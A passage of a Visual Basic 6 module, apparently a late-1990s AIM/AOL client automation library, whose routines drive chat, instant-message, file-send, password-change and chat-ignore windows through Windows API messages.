    AIM_Txt& = FindWindowEx&(AIM&, 0&, "edit", vbNullString)
    AIM_AdTop& = FindWindowEx&(AIM&, 0&, "wndate32class", vbNullString)
    AIM_AdBottom& = FindWindowEx&(AIM&, AIM_AdTop&, "wndate32class", vbNullString)
    
If AIM& <> 0& Then
    Select Case ShowIt
        Case vHide
            Seen& = 0
        Case vShow
            Seen& = 5
    End Select
    
    Select Case Main
        Case mwAdTop
            ShowWindow AIM_AdTop&, Seen&
        Case mwAdBottom
            ShowWindow AIM_AdBottom&, Seen&
        Case mwButtonIM
            ShowWindow Tab_IM&, Seen&
        Case mwButtonChatInvite
            ShowWindow Tab_Invite&, Seen&
        Case mwButtonFind
            ShowWindow Tab_Find&, Seen&
        Case mwBuddies
            ShowWindow Tab_Buddies&, Seen&
        Case mwGo
            ShowWindow AIM_Go&, Seen&
        Case mwTowers
            ShowWindow Tab_Towers&, Seen&
        Case mwMyNews
            ShowWindow Tab_MyNews&, Seen&
        Case mwTxt
            ShowWindow AIM_Txt&, Seen&
        Case mwTab
            ShowWindow AIM_Tab&, Seen&
        Case mwUseful
            ShowWindow AIM_AdTop&, Seen&
            ShowWindow AIM_AdBottom&, Seen&
            ShowWindow Tab_IM&, Seen&
            ShowWindow Tab_Invite&, Seen&
            ShowWindow AIM_Go&, Seen&
            ShowWindow AIM_Txt&, Seen&
            ShowWindow Tab_Find&, Seen&
            ShowWindow Tab_MyNews&, Seen&
            ShowWindow Tab_Towers&, Seen&
        Case mwAll
            ShowWindow AIM_AdTop&, Seen&
            ShowWindow AIM_AdBottom&, Seen&
            ShowWindow AIM_Go&, Seen&
            ShowWindow AIM_Txt&, Seen&
            ShowWindow AIM_Tab&, Seen&
            ShowWindow Tab_IM&, Seen&
            ShowWindow Tab_Invite&, Seen&
            ShowWindow Tab_Buddies&, Seen&
            ShowWindow Tab_Find&, Seen&
            ShowWindow Tab_MyNews&, Seen&
            ShowWindow Tab_Towers&, Seen&
    End Select

End If


End Sub

Public Function AIM_Online() As Boolean

Dim AIM As Long
AIM& = FindWindow&("_oscar_buddylistwin", vbNullString)
    If AIM& <> 0& Then
        AIM_Online = True
        Exit Function
    End If
AIM_Online = False

End Function
Public Sub AIM_WebOpenPage(URL As String)

'this is for opening a web page from aim

Dim AIM As Long
Dim AIM_Go As Long
Dim AIM_Txt As Long

AIM& = FindWindow&("_oscar_buddylistwin", vbNullString)
    If AIM& = 0& Then Exit Sub
        AIM_Txt& = FindWindowEx&(AIM&, 0&, "edit", vbNullString)
        SendMessageByString& AIM_Txt&, &HC, 0&, URL$
        AIM_Go& = FindWindowEx&(AIM&, 0&, "_oscar_iconbtn", vbNullString)
        PostMessage& AIM_Go&, &H201, 0&, 0&
        PostMessage& AIM_Go&, &H202, 0&, 0&

End Sub

Public Sub AIM_QuickChat(RoomName As String, RoomType As Chat)
Dim AIM As Long
Dim AIM_Go As Long
Dim AIM_Txt As Long

AIM& = FindWindow&("_oscar_buddylistwin", vbNullString)
    If AIM& <> 0& Then
        AIM_Txt& = FindWindowEx&(AIM&, 0&, "edit", vbNullString)
        Select Case RoomType
            Case cPrivate
                SendMessageByString& AIM_Txt&, &HC, 0&, "aim:gochat?roomname=" & ReplaceString(RoomName, " ", "+")
            Case cPublic
                SendMessageByString& AIM_Txt&, &HC, 0&, "aim:gochat?roomname=" & ReplaceString(RoomName, " ", "+") & "exchange=5"
        End Select
        AIM_Go& = FindWindowEx&(AIM&, 0&, "_oscar_iconbtn", vbNullString)
        PostMessage& AIM_Go&, &H201, 0&, 0&
        PostMessage& AIM_Go&, &H202, 0&, 0&
    End If
End Sub

Public Sub AIM_SendFile(SN As String, DirFile As String)

'okay this sub is useful
'it will send a file to the person that you choose
'this sub was a pain in the ass to write

'if you want to copy it, then i'll see you in hell
'thats right i'm bitching, i wanted to do this
'in my dll/ocx but i owe wgf as much as i can do

'on the plus side, this is the first bas to offer this

Dim AIM As Long
Dim AIM_Go As Long
Dim AIM_Txt As Long
Dim IM As Long
Dim IM_Send As Long
Dim IM_SendFile As Long
Dim SendFile_Send As Long
Dim SendFile_File As Long
Dim IMSn$


If Len(Dir(DirFile$)) Then

    IM& = FindWindow&("aim_imessage", vbNullString)
        If IM& <> 0& Then
            If LCase(ReplaceString(GetCaption(IM&), " - Instant Message", "")) Like LCase(SN) Then
                
                RunMenuByString IM&, "Send &File"
                    
                    Do
                        IM_SendFile& = FindWindow&("#32770", "Send File to " & ReplaceString(GetCaption(IM&), " - Instant Message", ""))
                    Loop Until IM_SendFile& <> 0&
                
                SendFile_File& = FindWindowEx&(IM_SendFile&, 0&, "edit", vbNullString)
                SendMessageByString SendFile_File&, &HC, 0&, ""
                SendMessageByString SendFile_File&, &HC, 0&, DirFile$
                                
                SendFile_Send& = FindWindowEx&(IM_SendFile&, 0&, "button", "&Send")
                PostMessage SendFile_Send&, &H201, 0&, 0&
                PostMessage SendFile_Send&, &H202, 0&, 0&
            Else
                Do
                    IM& = FindWindowEx&(0&, IM&, "aim_imessage", vbNullString)
                        If LCase(ReplaceString(GetCaption(IM&), " - Instant Message", "")) Like LCase(SN) Then
                
                            RunMenuByString IM&, "Send &File"
                    
                            Do
                                IM_SendFile& = FindWindow&("#32770", "Send File to " & ReplaceString(GetCaption(IM&), " - Instant Message", ""))
                            Loop Until IM_SendFile& <> 0&
                
                            SendFile_File& = FindWindowEx&(IM_SendFile&, 0&, "edit", vbNullString)
                            SendMessageByString SendFile_File&, &HC, 0&, ""
                            SendMessageByString SendFile_File&, &HC, 0&, DirFile$
                            
                            SendFile_Send& = FindWindowEx&(IM_SendFile&, 0&, "button", "&Send")
                            PostMessage SendFile_Send&, &H201, 0&, 0&
                            PostMessage SendFile_Send&, &H202, 0&, 0&
                            Exit Sub
                        End If
                    Loop Until IM& = 0&
            End If
        Else
            AIM& = FindWindow&("_oscar_buddylistwin", vbNullString)
                If AIM& <> 0& Then
                    AIM_Txt& = FindWindowEx&(AIM&, 0&, "edit", vbNullString)
                    SendMessageByString AIM_Txt&, &HC, 0&, "aim:goim?screename=" & ReplaceString(SN, " ", "+") & "&message=hey,+sup?"
                    
                    AIM_Go& = FindWindowEx&(AIM&, 0&, "_oscar_iconbtn", vbNullString)
                    PostMessage AIM_Go&, &H201, 0&, 0&
                    PostMessage AIM_Go&, &H202, 0&, 0&
                    
                    Do
                        IM& = FindWindow&("aim_imessage", vbNullString)
                    Loop Until IM& <> 0&
                    
                    IM_Send& = FindWindowEx&(IM&, 0&, "_oscar_iconbtn", vbNullString)
                    PostMessage IM_Send&, &H201, 0&, 0&
                    PostMessage IM_Send&, &H202, 0&, 0&
                    
                    Pause 1
                    'this is in case you have a problem with lagging....
                    RunMenuByString IM&, "Send &File"
                    
                    Do
                        IM_SendFile& = FindWindow&("#32770", "Send File to " & ReplaceString(GetCaption(IM&), " - Instant Message", ""))
                    Loop Until IM_SendFile& <> 0&
                
                    SendFile_File& = FindWindowEx&(IM_SendFile&, 0&, "edit", vbNullString)
                    SendMessageByString SendFile_File&, &HC, 0&, ""
                    SendMessageByString SendFile_File&, &HC, 0&, DirFile$
                    
                    SendFile_Send& = FindWindowEx&(IM_SendFile&, 0&, "button", "&Send")
                    PostMessage SendFile_Send&, &H201, 0&, 0&
                    PostMessage SendFile_Send&, &H202, 0&, 0&
                End If
        End If

End If

'okay this sub does a lot of things
'first it will cycle through the open ims and look for the persons sn
'then if it can't find an im or the persons sn
'it will open an im to that person and send a message
'then it will pause itself incase you are lagging

'if it ever finds the person online then it will send the file to them
'willing that they accept the file

End Sub

Public Function AIM_StripHTML(Txt As String) As String
    
'nice and orderly, its all aplhpabetatized ;c)
'way too much time on my hands?
'i think so

    Txt$ = ReplaceString(Txt$, "<b>", "")
    Txt$ = ReplaceString(Txt$, "</b>", "")
    Txt$ = ReplaceString(Txt$, "<body bgcolor=" & """" & "#******" & """" & ">", "")
    Txt$ = ReplaceString(Txt$, "<br>", "" & Chr$(13) + Chr$(10))
    Txt$ = ReplaceString(Txt$, "<font>", "")
    Txt$ = ReplaceString(Txt$, "</font>", "")
    Txt$ = ReplaceString(Txt$, "<font color=" & """" & "#******" & """" & ">", "")
    Txt$ = ReplaceString(Txt$, "<html>", "")
    Txt$ = ReplaceString(Txt$, "</html>", "")
    Txt$ = ReplaceString(Txt$, "<i>", "")
    Txt$ = ReplaceString(Txt$, "</i>", "")
    Txt$ = ReplaceString(Txt$, "<s>", "")
    Txt$ = ReplaceString(Txt$, "</s>", "")
    Txt$ = ReplaceString(Txt$, "<u>", "")
    Txt$ = ReplaceString(Txt$, "</u>", "")
    AIM_StripHTML = Txt$

End Function

Public Sub AIM_TimeStamps(hWnd As RateAndStamps, Optional All As Boolean)

'this will turn timestamps on/off
'honestly i can say there is no good reason to use this sub :/

Dim Chat As Long
Dim IM As Long
  
Chat& = FindWindow&("aim_chatwnd", vbNullString)
IM& = FindWindow&("aim_imessage", vbNullString)

Select Case hWnd
    Case tsChat
        If Not Chat& <> 0 Then Exit Sub
            RunMenuByString Chat&, "Timestamp"
            If All = True Then
                Do
                    Chat& = FindWindowEx&(0&, Chat&, "aim_chatwnd", vbNullString)
                    RunMenuByString Chat&, "Timestamp"
                Loop Until Chat& = 0&
            End If
    Case tsIM
        If Not IM& <> 0 Then Exit Sub
            RunMenuByString IM&, "Timestamp"
            If All = True Then
                Do
                    IM& = FindWindowEx&(0&, IM&, "aim_imessage", vbNullString)
                    RunMenuByString IM&, "Timestamp"
                Loop Until IM& = 0&
            End If
    Case tsBoth
        If Chat& <> 0 Then
            RunMenuByString Chat&, "Timestamp"
                If All = True Then
                    Do
                        Chat& = FindWindowEx&(0&, Chat&, "aim_chatwnd", vbNullString)
                        RunMenuByString Chat&, "Timestamp"
                    Loop Until Chat& = 0&
                End If
        End If
        
        If IM& <> 0 Then
            RunMenuByString Chat&, "Timestamp"
                If All = True Then
                    Do
                        IM& = FindWindowEx&(0&, IM&, "aim_imessage", vbNullString)
                        RunMenuByString Chat&, "Timestamp"
                    Loop Until IM& = 0&
                End If
        End If
End Select

End Sub
Public Function AIM_ChatLastLine(Optional RoomName As String, Optional StripHTML As Boolean) As String
    
'this will get the last line in the topmost chat room
'or the chat room of your choice
'and will strip the html from that line, if you want it to
'this is very very very useful ;)

Dim Chat As Long
Dim Chat_Txt As Long
Dim Txt As String

    Chat& = FindWindow&("aim_chatwnd", vbNullString)
    If Chat& = 0& Then Exit Function 'should have been using this the whole time :/
        If Len(RoomName) <> 0& Then
            If LCase(ReplaceString(GetCaption(Chat&), "Chat Room: ", "")) Like LCase(RoomName) Then
                Chat_Txt& = FindWindowEx&(Chat&, 0&, "wndate32class", vbNullString)
                If StripHTML = True Then
                    AIM_ChatLastLine$ = AIM_StripHTML(AIM_LineFromText(GetText(Chat_Txt&), SendMessage(Chat_Txt&, EM_GETLINECOUNT, 0&, 0&)))
                    Exit Function
                Else
                    AIM_ChatLastLine$ = AIM_LineFromText(GetText(Chat_Txt&), SendMessage(Chat_Txt&, EM_GETLINECOUNT, 0&, 0&))
                    Exit Function
                End If
            Else
                Do
                    Chat& = FindWindowEx&(0&, Chat&, "aim_chatwnd", vbNullString)
                        If LCase(ReplaceString(GetCaption(Chat&), "Chat Room: ", "")) Like LCase(RoomName) Then
                            Chat_Txt& = FindWindowEx&(Chat&, 0&, "wndate32class", vbNullString)
                            If StripHTML = True Then AIM_ChatLastLine$ = AIM_StripHTML(AIM_LineFromText(GetText(Chat_Txt&), SendMessage(Chat_Txt&, EM_GETLINECOUNT, 0&, 0&))): Exit Function
                            AIM_ChatLastLine$ = AIM_LineFromText(GetText(Chat_Txt&), SendMessage(Chat_Txt&, EM_GETLINECOUNT, 0&, 0&))
                            Exit Function
                        End If
                Loop Until Chat& = 0
            End If
        Else
            If StripHTML = True Then
                AIM_ChatLastLine$ = AIM_StripHTML(AIM_LineFromText(GetText(Chat_Txt&), SendMessage(Chat_Txt&, EM_GETLINECOUNT, 0&, 0&)))
                Exit Function
            Else
                AIM_ChatLastLine$ = AIM_LineFromText(GetText(Chat_Txt&), SendMessage(Chat_Txt&, EM_GETLINECOUNT, 0&, 0&))
                Exit Function
                End If
        End If
    
End Function
Public Function AIM_LineFromText(Text As String, TheLine As Long) As String

'taken from bofen's site
'stuff added by me to make this function
'actually work ;c)
'so its a 50-50 thing

Dim FindChar As Long
Dim TheChar As String
Dim TheChars As String
Dim TempNum As Long
Dim TheText As String
For FindChar = 1 To Len(Text)
    TheChar = Mid(Text, FindChar, 1)
    TheChars = TheChars & TheChar
        If TheChar = Chr(13) Then
            TempNum = TempNum + 1
            TheText = Mid(TheChars, 1, Len(TheChars) - 1)
            If TheLine = TempNum Then GoTo SkipIt
            TheChars = ""
        End If
Next FindChar
AIM_LineFromText = TheChars
'bofen forgot this line of code
'it made the program skip the last line of text!!
Exit Function
SkipIt:
TheText = ReplaceString$(TheText, Chr(13), "")
AIM_LineFromText = TheText

End Function

Public Sub AIM_RateMeters(hWnd As RateAndStamps, ShowIt As Vis, Optional All As Boolean)

'this sub will hide rate meters on im(s) and/or chat(s)
'big deal, right?

Dim Chat As Long
Dim Chat_Rate As Long
Dim IM As Long
Dim IM_Rate As Long
Dim Seen As Long

Select Case ShowIt
    Case vShow
        Seen& = 5
    Case vHide
        Seen& = 0
End Select
    
Chat& = FindWindow&("aim_chatwnd", vbNullString)
IM& = FindWindow&("aim_imessage", vbNullString)

Select Case hWnd
    Case tsChat
        If Not Chat& <> 0 Then Exit Sub
        Chat_Rate& = FindWindowEx&(Chat&, 0&, "_oscar_ratemeter", vbNullString)
            ShowWindow Chat_Rate&, Seen&
            If All = True Then
                Do
                    Chat& = FindWindowEx&(0&, Chat&, "aim_chatwnd", vbNullString)
                    Chat_Rate& = FindWindowEx&(Chat&, 0&, "_oscar_ratemeter", vbNullString)
                    ShowWindow Chat_Rate&, Seen&
                Loop Until Chat& = 0&
            End If
    Case tsIM
        If Not IM& <> 0 Then Exit Sub
        IM_Rate& = FindWindowEx&(IM&, 0&, "_oscar_ratemeter", vbNullString)
            ShowWindow IM_Rate&, Seen&
            If All = True Then
                Do
                    IM& = FindWindowEx&(0&, IM&, "aim_imessage", vbNullString)
                    IM_Rate& = FindWindowEx&(IM&, 0&, "_oscar_ratemeter", vbNullString)
                    ShowWindow IM_Rate&, Seen&
                Loop Until IM& = 0&
            End If
    Case tsBoth
        If Chat& <> 0 Then
            Chat_Rate& = FindWindowEx&(Chat&, 0&, "_oscar_ratemeter", vbNullString)
                ShowWindow Chat_Rate&, Seen&
                If All = True Then
                    Do
                        Chat& = FindWindowEx&(0&, Chat&, "aim_chatwnd", vbNullString)
                        Chat_Rate& = FindWindowEx&(Chat&, 0&, "_oscar_ratemeter", vbNullString)
                        ShowWindow Chat_Rate&, Seen&
                    Loop Until Chat& = 0&
                End If
        End If
        
        If IM& <> 0 Then
            IM_Rate& = FindWindowEx&(IM&, 0&, "_oscar_ratemeter", vbNullString)
                ShowWindow IM_Rate&, Seen&
                If All = True Then
                    Do
                        IM& = FindWindowEx&(0&, IM&, "aim_imessage", vbNullString)
                        IM_Rate& = FindWindowEx&(IM&, 0&, "_oscar_ratemeter", vbNullString)
                        ShowWindow IM_Rate&, Seen&
                    Loop Until IM& = 0&
                End If
        End If
End Select

End Sub

Public Function AIM_UserSn() As String
'this will return the user's sn if they are signed on to aim

Dim AIM As Long
AIM& = FindWindow&("_oscar_buddylistwin", vbNullString)
    If AIM& <> 0& Then
        AIM_UserSn$ = ReplaceString(GetCaption(AIM&), "'s Buddy List Window", "")
    Else
        AIM_UserSn$ = ""
    End If
    
End Function


Public Sub AIM_WebSearchFor(SearchFor As String)

'okay this sub is exactly like AIM_WebOpenPage
'but sssshhhhh, some people don't know that

Dim AIM As Long
Dim AIM_Go As Long
Dim AIM_Txt As Long

AIM& = FindWindow&("_oscar_buddylistwin", vbNullString)
    If AIM& = 0& Then Exit Sub
        AIM_Txt& = FindWindowEx&(AIM&, 0&, "edit", vbNullString)
        SendMessageByString& AIM_Txt&, &HC, 0&, SearchFor$
        AIM_Go& = FindWindowEx&(AIM&, 0&, "_oscar_iconbtn", vbNullString)
        PostMessage& AIM_Go&, &H201, 0&, 0&
        PostMessage& AIM_Go&, &H202, 0&, 0&

End Sub

Public Function AolMDI() As Long
'This sort of ticks me off that I thought of this after I wrote most of my subs it saves a few dims, heh.
        Dim AoFrame As Long, AoMDI As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
End Function
Public Sub Button(myButton As Long)
'Clicks AoButtons
'Example:
'Call Button(MyButton&)
Call SendMessage(myButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call SendMessage(myButton&, WM_KEYUP, VK_SPACE, 0&)
End Sub
Public Sub BuddyInvitation(Person As String, message As String, RoomOrUrl As String, Optional RoomOrWebUrl As String = "Room")
        Dim AoFrame As Long, AoMDI As Long, AoChild As Long
        Dim AoIcon1 As Long, AoIcon2 As Long, BuddyInviteWindow As Long
        Dim AoEdit1 As Long, AoEdit2 As Long, AoEdit3 As Long
        Dim CheckBox1 As Long, CheckBox2 As Long, AoEdit4 As Long
        Dim MessageOk As Long, OKButton As Long
If RoomOrWebUrl$ = "Room" Then
If Len(RoomOrUrl$) > 20 Then Exit Sub
End If
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
If FindBuddyView& = 0& Then
Call PopUpIcon(9, "V")
End If
Do: DoEvents
AoIcon1& = NextOfClassByCount(FindBuddyView&, "_AOL_Icon", 4)
Loop Until FindBuddyView& <> 0& And AoIcon1& <> 0&
Call PostMessage(AoIcon1&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon1&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
BuddyInviteWindow& = FindWindowEx(AolMDI&, 0&, "AOL Child", "Buddy Chat")
AoIcon2& = FindWindowEx(BuddyInviteWindow&, 0&, "_AOL_Icon", vbNullString)
AoEdit1& = FindWindowEx(BuddyInviteWindow&, 0&, "_AOL_Edit", vbNullString)
AoEdit2& = FindWindowEx(BuddyInviteWindow&, AoEdit1&, "_AOL_Edit", vbNullString)
AoEdit3& = FindWindowEx(BuddyInviteWindow&, AoEdit2&, "_AOL_Edit", vbNullString)
CheckBox1& = FindWindowEx(BuddyInviteWindow&, 0&, "_AOL_Checkbox", vbNullString)
CheckBox2& = FindWindowEx(BuddyInviteWindow&, CheckBox1&, "_AOL_Checkbox", vbNullString)
Loop Until BuddyInviteWindow& <> 0& And AoIcon2& <> 0& And AoEdit1& <> 0& And AoEdit2& <> 0& And AoEdit3& <> 0& And CheckBox1& <> 0& And CheckBox2& <> 0&
Call SendMessageByString(AoEdit1&, WM_SETTEXT, 0&, Person$)
Call SendMessageByString(AoEdit2&, WM_SETTEXT, 0&, message$)
If LCase(TrimSpaces(RoomOrWebUrl$)) Like LCase("Room") Then
Call PostMessage(CheckBox1&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(CheckBox1&, WM_LBUTTONUP, 0&, 0&)
Call SendMessageByString(AoEdit3&, WM_SETTEXT, 0&, RoomOrUrl$)
ElseIf LCase(TrimSpaces(RoomOrWebUrl$)) Like LCase("WebUrl") Then
Call PostMessage(CheckBox2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(CheckBox2&, WM_LBUTTONUP, 0&, 0&)
AoEdit4& = FindWindowEx(BuddyInviteWindow&, AoEdit3&, "_AOL_Edit", vbNullString)
Call SendMessageByString(AoEdit4&, WM_SETTEXT, 0&, RoomOrUrl$)
End If
Call PostMessage(AoIcon2&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(AoIcon2&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
MessageOk& = FindWindow("#32770", "America Online")
Loop Until MessageOk& <> 0& Or FindWindowEx(AoMDI&, 0&, "AOL Child", "Buddy Chat") = 0&
If MessageOk& <> 0& Then
OKButton& = FindWindowEx(MessageOk&, 0&, "Button", vbNullString)
Call PostMessage(OKButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call PostMessage(OKButton&, WM_KEYUP, VK_SPACE, 0&)
Call PostMessage(BuddyInviteWindow&, WM_CLOSE, 0&, 0&)
Exit Sub
End If
End Sub

Public Function CD_ChangeTrackCD(track As String)
Call MciSendString("seek cd to " & track$, 0, 0, 0)
End Function
Public Sub CD_PlayCD()
Call MciSendString("play cd", 0, 0, 0)
End Sub
Public Function CD_StopCD()
Call MciSendString("stop cd wait", 0, 0, 0)
End Function
Public Sub CD_PauseCD()
Call MciSendString("pause cd", 0, 0, 0)
End Sub
Public Sub CheckBoxSetValue(CheckBox As Long, CheckValue As Boolean)
'Makes a check box true or false
Call PostMessage(CheckBox&, BM_SETCHECK, CheckValue, 0&)
End Sub
Public Sub ClickButton(myButton As Long)
'Clicks AoButtons
'Example:
'Call Button(MyButton&)
Call SendMessage(myButton&, WM_KEYDOWN, VK_SPACE, 0&)
Call SendMessage(myButton, WM_KEYUP, VK_SPACE, 0&)
End Sub
Public Sub xChatBold(Text As String)
RoomSend ("<b>" & Text$ & "</b>")
End Sub
Public Sub xChatBoldItalic(Text As String)
RoomSend ("<b><i>" & Text$ & "</b></i>")
End Sub
Public Sub xChatBoldItalicUnderLine(Text As String)
RoomSend ("<b><i><u>" & Text$ & "</b></i></u>")
End Sub
Public Sub xChatBoldItalicUnderLineStike(Text As String)
RoomSend ("<b><i><u>" & Text$ & "</b></i></u>")
End Sub
Public Sub xChatItalic(Text As String)
RoomSend ("<i>" & Text$ & "</i>")
End Sub
Public Sub xChatItalicUnderline(Text As String)
RoomSend ("<i><u>" & Text$ & "</i></u>")
End Sub
Public Sub xChatItalicStrike(Text As String)
RoomSend ("<i><s>" & Text$ & "</i></s>")
End Sub
Public Sub xChatItalicUnderlineStrike(Text As String)
RoomSend ("<i><s><u>" & Text$ & "</i></s></u>")
End Sub
Public Sub xChatStrike(Text As String)
RoomSend ("<s>" & Text$ & "</s>")
End Sub
Public Sub xChatBoldStrike(Text As String)
RoomSend ("<b><s>" & Text$ & "</b></s>")
End Sub
Public Sub xChatUnderlineStrikeBold(Text As String)
RoomSend ("<u><s>" & Text$ & "</u></s>")
End Sub
Public Sub xChatBoldUnderline(Text As String)
RoomSend ("<u><b>" & Text$ & "</u></b>")
End Sub
Public Sub xChatUnderline(Text As String)
RoomSend ("<u>" & Text$ & "</u>")
End Sub

Public Sub ChatIgnoreByIndex(ListIndex As Long, Optional IgnoreOrUnignore As Boolean = True)
'Same as dos's chatignorebyindex except this gives you an option of unignoring and ignoring
        Dim RoomList As Long, AboutWindow As Long, CheckBox As Long
        Dim CheckValue As Boolean
RoomList& = FindWindowEx(FindRoom&, 0&, "_AOL_listbox", vbNullString)
Call SendMessageLong(RoomList&, LB_SETCURSEL, ListIndex&, 0&)
Call PostMessage(RoomList&, WM_LBUTTONDBLCLK, 0&, 0&)
Do: DoEvents
AboutWindow& = FindAboutWindow&
CheckBox& = FindWindowEx(AboutWindow&, 0&, "_AOL_Checkbox", vbNullString)
Loop Until AboutWindow& <> 0& And CheckBox& <> 0&
If IgnoreOrUnignore = True Then
Do: DoEvents
CheckValue = CheckBoxGetValue(CheckBox&)
DoEvents
Call PostMessage(CheckBox&, WM_LBUTTONDOWN, 0&, 0&)
DoEvents
Call PostMessage(CheckBox&, WM_LBUTTONUP, 0&, 0&)
DoEvents
Loop Until CheckValue = True
ElseIf IgnoreOrUnignore = False Then
Do: DoEvents
CheckValue = CheckBoxGetValue(CheckBox&)
DoEvents
Call PostMessage(CheckBox&, WM_LBUTTONDOWN, 0&, 0&)
DoEvents
Call PostMessage(CheckBox&, WM_LBUTTONUP, 0&, 0&)
DoEvents
Loop Until CheckValue = False
End If
DoEvents
Call PostMessage(AboutWindow&, WM_CLOSE, 0&, 0&)
End Sub
Public Sub ChatIgnoreByName(ScreenName As String, Optional IgnoreOrUnignore As Boolean = True)
'Same as dos's chatignorebyname except this gives you an option of ignoring thn unignoring
        Dim Elwgf As Long, ListHoldItem As Long, Name As String
        Dim ListHoldName As Long, BytesRead As Long, ListHandle As Long
        Dim ProcessThread As Long, SearchIndex As Long
ListHandle& = FindWindowEx(FindRoom&, 0&, "_AOL_Listbox", vbNullString)
Call GetWindowThreadProcessId(ListHandle&, Elwgf&)
ProcessThread& = OpenProcess(Op_Flags, False, Elwgf&)
If ProcessThread& Then
For SearchIndex& = 0 To ListCount(ListHandle&) - 1
Name$ = String(4, vbNullChar)
ListHoldItem& = SendMessage(ListHandle&, LB_GETITEMDATA, ByVal CLng(SearchIndex&), 0&)
ListHoldItem& = ListHoldItem& + 24
Call ReadProcessMemory(ProcessThread&, ListHoldItem&, Name$, 4, BytesRead&)
Call RtlMoveMemory(ListHoldItem&, ByVal Name$, 4)
ListHoldItem& = ListHoldItem& + 6
Name$ = String(16, vbNullChar)
Call ReadProcessMemory(ProcessThread&, ListHoldItem&, Name$, Len(Name$), BytesRead&)
Name$ = Left(Name$, InStr(Name$, vbNullChar) - 1)
If LCase(TrimSpaces(Name$)) <> LCase(TrimSpaces(usersn$)) And LCase(TrimSpaces(Name$)) = LCase(TrimSpaces(ScreenName$)) Then
SearchIndex& = SearchIndex&
Call RoomIgnoreByIndex(SearchIndex&, IgnoreOrUnignore)
Exit Sub
End If
Next SearchIndex&
Call CloseHandle(ProcessThread&)
End If
End Sub
Public Function ChatLineMsg(chatline As String) As String
'Seperates ChatMsg from ChatSn
'Example:
'Dim SayWhat As String, ChatText As String
'ChatText = Text1.Text
'SayWhat$ = ChatLineMsg(ChatText$)

If InStr(chatline, Chr(9)) = 0 Then
ChatLineMsg = ""
Exit Function
End If
ChatLineMsg = Right(chatline, Len(chatline) - InStr(chatline, Chr(9)))
End Function
Public Function ChatLineSN(ChtLine As String) As String
'Seperates ChatMsg from ChatSn
'Example:
'Dim SN As String, ChatText As String
'ChatText = Text1.Text
'SN$ = ChatLineMsg(ChatText$)
If InStr(ChtLine, ":") = 0 Then
ChatLineSN = ""
Exit Function
End If
ChatLineSN = Left(ChtLine, InStr(ChtLine, ":") - 1)
End Function
Public Sub ChatSend(Text As String)
'Sends Text To The Chat
        Dim Rm As Long, AORich As Long, AORich2 As Long
Rm& = FindRoom&
AORich& = FindWindowEx(Rm, 0&, "RICHCNTL", vbNullString)
AORich2& = FindWindowEx(Rm, AORich, "RICHCNTL", vbNullString)
Call SendMessageByString(AORich2, WM_SETTEXT, 0&, Text$)
Call SendMessageLong(AORich2, WM_CHAR, ENTER_KEY, 0&)
End Sub
Function ChangePassword(OldPW As String, NewPW As String)
'Changes your password(and no it dosnt steal it and send it to me)
'I dont know if its fully functional
        Dim AoFrame As Long, AoModal As Long, AoIcon As Long
        Dim RichTxt As Long, richcntl As Long, RichTxt2 As Long, RichTxt3 As Long
        Dim AoEdit As Long, ErrWin As Long
Call Keyword("password")
Do: DoEvents
AoFrame& = FindWindow("AOL Frame25", "America  Online")
AoModal& = FindWindow("_AOL_Modal", vbNullString)
AoIcon& = FindWindowEx(AoModal&, 0, "_AOL_Icon", vbNullString)
RichTxt& = FindWindowEx(AoModal&, 0, "RICHCNTL", vbNullString)
richcntl& = FindWindowEx(AoModal&, RichTxt&, "RICHCNTL", vbNullString)
Loop Until AoModal& <> 0& And AoIcon& <> 0& And RichTxt& <> 0& And AoIcon& <> 0&
Call SendMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
AoModal& = FindWindow("_AOL_Modal", vbNullString)
RichTxt2& = FindWindowEx(AoModal&, 0, "_AOL_Edit", vbNullString)
RichTxt3& = FindWindowEx(AoModal&, RichTxt2&, "_AOL_Edit", vbNullString)
AoEdit& = FindWindowEx(AoModal&, RichTxt3&, "_AOL_Edit", vbNullString)
AoIcon& = FindWindowEx(AoModal&, 0, "_AOL_Icon", vbNullString)
Loop Until AoModal& <> 0& And RichTxt2& <> 0& And RichTxt3& <> 0& And AoEdit& <> 0& And AoIcon& <> 0&
Call SendMessageByString(RichTxt2&, WM_SETTEXT, 0&, OldPW$)
Call SendMessageByString(RichTxt3&, WM_SETTEXT, 0&, NewPW$)
Call SendMessageByString(AoEdit&, WM_SETTEXT, 0&, NewPW$)
Call SendMessage(AoIcon&, WM_LBUTTONDOWN, 0&, 0&)
Call SendMessage(AoIcon&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
ErrWin& = FindWindow("#32770", "America Online")
Loop Until ErrWin& <> 0
If ErrWin& <> 0 Then
ErrWin& = FindWindowEx(ErrWin&, 0&, "Button", vbNullString)
Call SendMessage(ErrWin&, WM_KEYDOWN, VK_SPACE, 0&)
Call SendMessage(ErrWin&, WM_KEYUP, VK_SPACE, 0&)
Pause 0.5
MsgBox "Your Password has been changed."
End If
End Function

Public Sub ChatLink(URL As String, LinkTxt As String)
'Sends a link to the room
'Example:
'Chatlink"http://i.am/wgf","Come to the coolest vb site in the world"
RoomSend "< a href=" & Chr(34) & URL$ & Chr(34) & ">" & LinkTxt$ & "</a>"
End Sub
Public Function CheckAlive(SN As String) As Boolean
'Checks if person is online (account active)
'Example:
'CheckAlive(getuser)

        Dim aol As Long, MDI As Long, ErrorWin As Long
        Dim ErrorTxtWin As Long, ErrorString As String
        Dim MailWin As Long, NoWin As Long, NoButton As Long
Call SendMail(", " & SN$, "Are you still alive d00d?", ">o)")
aol& = FindWindow("AOL Frame25", vbNullString)
MDI& = FindWindowEx(aol&, 0&, "MDICLIENT", vbNullString)
Do
DoEvents
ErrorWin& = FindWindowEx(MDI&, 0&, "AOL Child", "Error")
